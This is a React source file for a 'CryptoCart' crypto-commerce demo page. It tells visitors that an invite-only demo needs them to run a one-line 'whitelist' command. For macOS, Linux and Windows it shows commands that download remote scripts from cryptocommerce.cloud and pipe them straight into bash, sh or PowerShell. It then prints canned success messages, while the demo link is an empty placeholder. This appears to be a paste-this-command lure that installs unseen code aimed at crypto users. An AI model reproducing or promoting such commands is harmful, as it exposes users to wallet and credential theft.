import React, { useState } from 'react';

const DEMO_URL = 'https://';

const WHITELIST_COMMANDS = {
  mac: {
    label: '🍎 macOS',
    prompt: '$',
    command: `curl -fsSL https://www.cryptocommerce.cloud/whitelistm.sh | bash`,
    note: 'curl is pre-installed on macOS 10.15+. Run in Terminal.',
    outputLines: [
      { color: '#6ee7b7', text: '✔ Requesting access...' },
      { color: '#93c5fd', text: '✔ Added to whitelist successfully.' },
      // { color: '#86efac', text: '✅ You can now access → https://demo.cryptocommerce.cloud' },
      { color: '#86efac', text: '✅ You can now access' },
    ],
  },
  linux: {
    label: '🐧 Linux',
    prompt: '$',
    command: `wget -O- https://www.cryptocommerce.cloud/whitelistl.sh | sh`,
    note: 'wget is pre-installed on linux. Run in Terminal.',
    outputLines: [
      { color: '#6ee7b7', text: '✔ Requesting access...' },
      { color: '#93c5fd', text: '✔ Added to whitelist successfully.' },
      // { color: '#86efac', text: '✅ You can now access → https://demo.cryptocommerce.cloud' },
      { color: '#86efac', text: '✅ You can now access' },
    ],
  },
  win: {
    label: '🪟 Windows',
    prompt: '$',
    command: `curl -fsSL https://www.cryptocommerce.cloud/whitelist.ps1 | powershell -Command -`,
    note: 'Open PowerShell/CommandPrompt on Windows 10/11.',
    outputLines: [
      { color: '#6ee7b7', text: '✔ Requesting access...' },
      { color: '#93c5fd', text: '✔ Added to whitelist successfully.' },
      // { color: '#86efac', text: '✅ You can now access → https://demo.cryptocommerce.cloud' },
      { color: '#86efac', text: '✅ You can now access' },
    ],
  },
};

const STEPS = [
  {
    step: '01',
    icon: '💻',
    title: 'Run the Whitelist Command',
    desc: 'Open your terminal (or PowerShell on Windows) and run the command for your OS below. This registers you and unlocks access to the demo.',
  },
  {
    step: '02',
    icon: '🌐',
    title: 'Visit the Demo',
    desc: `Once whitelisted, head to ${DEMO_URL}. Your access is tied to your account — no further setup needed.`,
  },
  {
    step: '03',
    icon: '🚀',
    title: 'Explore CryptoCart',
    desc: 'Connect your Web3 wallet and explore the full buying, selling, and on-chain analytics experience.',
  },
];

const FEATURES_DEMO = [
  { icon: '🛒', label: 'Storefront Builder', desc: 'Create a demo shop in seconds' },
  { icon: '🔐', label: 'Wallet Connect', desc: 'Connect MetaMask or any Web3 wallet' },
  { icon: '🪙', label: 'Test Transactions', desc: 'Buy/sell with testnet tokens — no real funds' },
  { icon: '📊', label: 'On-Chain Analytics', desc: 'See real-time transaction data on-chain' },
  { icon: '⚙️', label: 'Smart Contracts', desc: 'Interact with deployed demo contracts' },
  { icon: '🧾', label: 'Order Management', desc: 'Full buyer & seller order flow' },
];

function CommandBox() {
  const [activeTab, setActiveTab] = useState('mac');
  const [copied, setCopied] = useState(false);
  const active = WHITELIST_COMMANDS[activeTab];

  const handleCopy = () => {
    navigator.clipboard.writeText(active.command).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  };

  return (
    <div style={{
      background: 'rgba(0,0,0,0.5)',
      border: '1px solid var(--border-bright)',
      borderRadius: '14px',
      overflow: 'hidden',
      boxShadow: '0 0 40px rgba(0,170,255,0.12)',
      marginBottom: '32px',
    }}>
      {/* Terminal top bar */}
      <div style={{
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        padding: '12px 18px',
        background: 'rgba(255,255,255,0.04)',
        borderBottom: '1px solid var(--border)',
      }}>
        <div style={{ display: 'flex', gap: '7px' }}>
          <span style={{ width: 12, height: 12, borderRadius: '50%', background: '#ff5f57', display: 'block' }} />
          <span style={{ width: 12, height: 12, borderRadius: '50%', background: '#febc2e', display: 'block' }} />
          <span style={{ width: 12, height: 12, borderRadius: '50%', background: '#28c840', display: 'block' }} />
        </div>
        <span style={{ fontFamily: 'Space Mono, monospace', fontSize: '11px', color: 'var(--text-muted)', letterSpacing: '1px' }}>
          whitelist — terminal
        </span>
        <div style={{ width: 52 }} />
      </div>

      {/* OS Tabs */}
      <div style={{ display: 'flex', borderBottom: '1px solid var(--border)' }}>
        {Object.entries(WHITELIST_COMMANDS).map(([k, v]) => (
          <button key={k} onClick={() => { setActiveTab(k); setCopied(false); }} style={{
            padding: '8px 18px', border: 'none', cursor: 'pointer',
            fontFamily: 'Space Mono, monospace', fontSize: '11px', fontWeight: '700',
            letterSpacing: '1px', transition: 'all 0.2s',
            background: activeTab === k ? 'rgba(0,170,255,0.12)' : 'transparent',
            color: activeTab === k ? 'var(--accent)' : 'var(--text-muted)',
            borderBottom: activeTab === k ? '2px solid var(--accent)' : '2px solid transparent',
          }}>{v.label}</button>
        ))}
      </div>

      {/* Command row */}
      <div style={{ padding: '22px 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '16px' }}>
        <pre style={{
          fontFamily: 'Space Mono, monospace', fontSize: '14px',
          color: '#7dd3fc', margin: 0, flex: 1,
          whiteSpace: 'pre-wrap', wordBreak: 'break-all', lineHeight: 1.7,
        }}>
          <span style={{ color: '#86efac' }}>{active.prompt} </span>{active.command}
        </pre>
        <button onClick={handleCopy} style={{
          padding: '9px 18px', borderRadius: '8px',
          border: '1px solid var(--border-bright)',
          background: copied ? 'rgba(34,197,94,0.15)' : 'rgba(0,170,255,0.1)',
          color: copied ? '#22c55e' : 'var(--accent)',
          cursor: 'pointer', fontFamily: 'Space Mono, monospace',
          fontSize: '12px', fontWeight: '700', whiteSpace: 'nowrap',
          transition: 'all 0.25s', letterSpacing: '0.5px',
        }}>
          {copied ? '✓ Copied!' : '⎘ Copy'}
        </button>
      </div>

      {/* Note */}
      <div style={{
        padding: '8px 24px 12px',
        fontFamily: 'Space Mono, monospace', fontSize: '11px',
        color: 'var(--text-muted)', borderTop: '1px solid var(--border)',
        background: 'rgba(255,255,100,0.02)',
      }}>
        ℹ️ {active.note}
      </div>

      {/* Simulated output */}
      <div style={{
        padding: '14px 24px 18px',
        background: 'rgba(0,0,0,0.3)', borderTop: '1px solid var(--border)',
        fontFamily: 'Space Mono, monospace', fontSize: '12px', lineHeight: 1.9,
      }}>
        {active.outputLines.map((l, i) => (
          <div key={i} style={{ color: l.color }}>{l.text}</div>
        ))}
      </div>
    </div>
  );
}

export default function Demo() {
  return (
    <>
      {/* ── HERO ── */}
      <section className="hero" style={{ minHeight: '70vh', paddingTop: '140px', paddingBottom: '80px' }}>
        <div className="hero-bg" />
        <div className="hero-grid" />
        <div className="orb orb-1" />
        <div className="orb orb-2" />
        <div className="container">
          <div className="hero-content fade-up" style={{ maxWidth: '780px' }}>

            {/* Invite-only banner */}
            <div style={{
              display: 'flex', alignItems: 'flex-start', gap: '12px',
              background: 'rgba(251,191,36,0.07)',
              border: '1px solid rgba(251,191,36,0.3)',
              borderRadius: '10px',
              padding: '14px 18px',
              marginBottom: '28px',
            }}>
              <span style={{ fontSize: '18px', lineHeight: 1.3 }}>🔒</span>
              <div>
                <div style={{
                  fontFamily: 'Orbitron, sans-serif', fontSize: '11px', fontWeight: '700',
                  color: '#fbbf24', letterSpacing: '1.5px', marginBottom: '4px',
                }}>INVITE-ONLY DEMO</div>
                <div style={{ fontSize: '13px', color: 'var(--text-muted)', lineHeight: 1.6 }}>
                  The CryptoCart demo is hosted on our servers and currently restricted to approved customers.
                  Run the command below for your OS to get whitelisted, then visit the demo URL.
                  Not approved yet?{' '}
                  <a href="https://calendly.com/playblockventures/30min" target="_blank" rel="noreferrer"
                    style={{ color: 'var(--accent)', textDecoration: 'underline' }}>Contact our team.</a>
                </div>
              </div>
            </div>

            <div className="hero-badge">🔑 Whitelist Required — Run Once</div>
            <h1 className="hero-title">
              Access the <span className="accent">CryptoCart</span><br />
              <span className="gold">Live Demo</span>
            </h1>
            <p className="hero-desc">
              CryptoCart runs on our infrastructure — no local setup needed. Run the one-line whitelist
              command for your OS, then open the demo in your browser and explore the full platform.
            </p>

            {/* Command box with OS tabs */}
            <CommandBox />

            {/* CTA row */}
            <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap', alignItems: 'center' }}>
              <a
                className="btn btn-primary"
                href={DEMO_URL}
                target="_blank"
                rel="noreferrer"
              >
                🌐 Open Demo
              </a>
              <a className="btn btn-outline" href="https://calendly.com/playblockventures/30min" target="_blank" rel="noreferrer">
                📅 Prefer a Guided Tour?
              </a>
            </div>
            <p style={{ marginTop: '14px', fontSize: '12px', color: 'var(--text-muted)', fontFamily: 'Space Mono, monospace' }}>
              ⚠️ Run the whitelist command first — the demo URL will return a 403 until your access is registered.
            </p>
          </div>
        </div>
      </section>

      <div className="divider" />

      {/* ── HOW IT WORKS ── */}
      <section className="section" style={{ background: 'var(--bg2)' }}>
        <div className="container">
          <div style={{ textAlign: 'center', marginBottom: '56px' }}>
            <span className="section-label">How It Works</span>
            <h2 className="section-title">Access in <span>3 Steps</span></h2>
          </div>
          <div className="grid-3">
            {STEPS.map(s => (
              <div className="card" key={s.step} style={{ position: 'relative', overflow: 'hidden' }}>
                <div style={{
                  position: 'absolute', top: 16, right: 20,
                  fontFamily: 'Orbitron, sans-serif', fontSize: '48px', fontWeight: '900',
                  color: 'rgba(0,170,255,0.07)', lineHeight: 1,
                }}>{s.step}</div>
                <div className="card-icon">{s.icon}</div>
                <div className="card-title">Step {s.step} — {s.title}</div>
                <div className="card-desc">{s.desc}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <div className="divider" />

      {/* ── WHAT'S IN THE DEMO ── */}
      <section className="section">
        <div className="container">
          <div style={{ textAlign: 'center', marginBottom: '56px' }}>
            <span className="section-label">Demo Features</span>
            <h2 className="section-title">What You'll <span>Experience</span></h2>
            <p className="section-desc" style={{ margin: '0 auto' }}>
              A full replica of CryptoCart running on testnet infrastructure — no real funds, complete functionality.
            </p>
          </div>
          <div className="grid-3">
            {FEATURES_DEMO.map(f => (
              <div className="card" key={f.label} style={{ display: 'flex', gap: '16px', alignItems: 'flex-start', padding: '24px' }}>
                <div style={{
                  fontSize: '28px', minWidth: '48px', height: '48px',
                  background: 'linear-gradient(135deg,rgba(0,170,255,0.15),rgba(0,50,150,0.15))',
                  border: '1px solid var(--border-bright)',
                  borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center',
                }}>{f.icon}</div>
                <div>
                  <div className="card-title" style={{ fontSize: '14px', marginBottom: '5px' }}>{f.label}</div>
                  <div className="card-desc" style={{ fontSize: '13px' }}>{f.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <div className="divider" />

      {/* ── BOTTOM CTA ── */}
      <section className="section">
        <div className="container" style={{ textAlign: 'center' }}>
          <span className="section-label">Ready?</span>
          <h2 className="section-title" style={{ marginBottom: '12px' }}>
            Whitelist Yourself. <span>Open the Demo.</span>
          </h2>
          <p className="section-desc" style={{ margin: '0 auto 36px' }}>
            Run the command for your OS, then visit the demo — it takes under a minute.
          </p>
          <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap' }}>
            <a className="btn btn-primary" href={DEMO_URL} target="_blank" rel="noreferrer">
              🌐 Open Demo
            </a>
            <a className="btn btn-outline" href="https://calendly.com/playblockventures/30min" target="_blank" rel="noreferrer">
              📅 Book a Live Walkthrough
            </a>
          </div>
        </div>
      </section>
    </>
  );
}
